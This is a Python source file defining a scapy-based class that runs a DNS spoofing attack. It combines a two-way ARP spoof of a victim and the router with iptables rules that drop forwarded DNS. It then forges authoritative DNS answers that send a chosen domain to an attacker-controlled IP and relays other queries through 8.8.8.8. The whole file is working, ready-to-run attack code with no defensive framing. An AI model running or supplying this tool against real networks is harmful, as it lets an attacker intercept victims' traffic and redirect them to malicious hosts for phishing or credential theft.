from scapy.all import *
from arp import * 
from helper import *
import os

class dns:
    """
    Class to run a DNS spoofing attack
    """
    def __init__(self):
        self.stop_event = threading.Event()
        
    @staticmethod    
    def set_ip_forwarding(ip_forwarding, interface):
        """
        Sets the ip forwarding setting, enable or disable it
        Also adds or deletes the correct iptables rules
        """
        if ip_forwarding:
            print("Enabling IP forwarding")
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            run_iptables_command("sudo iptables -I FORWARD 1 -p udp --dport 53 -j DROP")
            run_iptables_command("sudo iptables -I FORWARD 2 -i %s -o %s -j ACCEPT" % (interface, interface))
            run_iptables_command("sudo iptables -I FORWARD 3 -o %s -i %s -j ACCEPT" % (interface, interface))
            
        else:
            print("Disabling IP forwarding")
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            try:
                run_iptables_command("sudo iptables -D FORWARD -i %s -o %s -j ACCEPT" % (interface, interface))
                run_iptables_command("sudo iptables -D FORWARD -o %s -i %s -j ACCEPT" % (interface, interface))
                run_iptables_command("sudo iptables -D FORWARD -p udp --dport 53 -j DROP")
            except Exception as e:
                print("WARNING: could not remove iptables rules, manual cleanup required")
                raise

    @staticmethod
    def send_spoof_packet(packet, domain, spoofed_ip):
        """
        Send a dns spoofing packet
        """
        spoofed_packet = (
            IP(dst=packet[IP].src, src=packet[IP].dst) /
            UDP(dport=packet[UDP].sport, sport=53) /
            DNS(
                id=packet[DNS].id,
                qr=1,
                aa=1,
                rd=1,
                ra=1,
                qd=packet[DNS].qd,
                an=DNSRR(rrname=domain, type='A', rdata=spoofed_ip, ttl=3000)
            )
        )
        send(spoofed_packet, verbose=False)
        print("Send spoofed DNS response for %s to %s with IP %s" % (domain, packet[IP].src, spoofed_ip))
        
    @staticmethod
    def request_domain(domain, packet):
        """
        Get the IP address of a domain
        """
        forward_request = IP(dst="8.8.8.8") / UDP(dport=53) / packet[DNS]
        
        res = sr1(forward_request, timeout=2, verbose=False)
        if res and res.haslayer(DNS) and res[DNS].qr == 1:
            victim_response = (
                IP(dst=packet[IP].src, src=packet[IP].dst) /
                UDP(dport=packet[UDP].sport, sport=53) /
                res[DNS]
            )
            print("Received response for %s, forwarding to victim" % domain)
            send(victim_response, verbose=False)


    @staticmethod
    def handle_packet(packet, domain, spoofed_ip, victim_ip, router_ip):
        """
        Handle a sniffed packet
        """
        
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and packet[IP].src == victim_ip:
            # packet is a DNS request packet
            query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8').rstrip('.')
            print("DNS query received from %s for %s (%s)" % (packet[IP].src, query_domain, "To be spoofed" if domain == query_domain else "Not spoofed"))

            if query_domain == domain:
                # request if for domain to be spoofed
                print("Spoofing %s to %s" % (domain, spoofed_ip))
                dns.send_spoof_packet(packet, domain, spoofed_ip)
                
            else:
                # Request is for domain that should not be spoofed so get legitimate IP
                dns.request_domain(query_domain, packet)
                
        else:
            # Packet is a DNS response packet
            # Could be from uncaught request, so drop
            pass
                 
    def start(self, interface, domain, victim_ip, spoofed_ip):
        """
        Start a DNS spoofing attack
        """
        self.stop_event.clear()
        print("Starting a DNS spoof for victim %s, pretending %s is at %s" % (victim_ip, domain, spoofed_ip))
        dns.set_ip_forwarding(True, interface)
        conf.route.resync()
        router_ip = conf.route.route("0.0.0.0")[2]
        arp1 = arp()
        arp_thread = threading.Thread(target=arp1.two_way_arp_spoof, args=(victim_ip, router_ip, 2, interface))
        arp_thread.start()
        while not self.stop_event.is_set():
            sniff(filter="udp and port 53", prn=lambda pkt: dns.handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface, timeout=1)
        print("stopping DNS spoof")
        arp1.stop()
        arp_thread.join()
        dns.set_ip_forwarding(False, interface)
        print("DNS spoofing stopped")
    
    def stop(self):
        """
        Stop a running DNS attack
        """
        self.stop_event.set()
            
            
        
